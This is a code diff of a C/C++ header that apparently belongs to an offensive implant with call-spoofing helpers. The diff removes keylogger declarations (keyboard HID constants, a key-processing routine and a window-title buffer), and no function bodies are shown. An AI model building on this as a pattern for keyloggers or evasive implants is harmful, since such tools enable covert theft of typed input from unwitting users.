@@ -34,23 +34,6 @@ typedef BindingFlags  IBindingFlags;
     } \
 }
 
-
-// definitions for Keylogger
-#define KEYLOG_CLASS_NAME L"KeyloggerClass" //need to change later
-#define HID_USAGE_PAGE_GENERIC 0x01
-#define HID_USAGE_GENERIC_KEYBOARD 0x06
-#define KEYLOG_BUFFER_LEN 250
-
-auto DECLFN CALLBACK WndCallback(
-    _In_ HWND   Window,
-    _In_ UINT   Message,
-    _In_ WPARAM WParam,
-    _In_ LPARAM LParam
-)->LRESULT;
-
-VOID ProcessWindowTitle();
-VOID ProcessKey(UINT Key);
-
 EXTERN_C PVOID StartPtr();
 EXTERN_C PVOID EndPtr();
 EXTERN_C PVOID SpoofCall( ... );
@@ -143,8 +126,6 @@ struct _INSTANCE {
     PVOID HeapHandle;
     PVOID Start;
     UPTR  Size;
-
-    WCHAR g_TitleBuffer[KEYLOG_BUFFER_LEN + 1];
 
     struct {
         BOOL  IsSpoof;
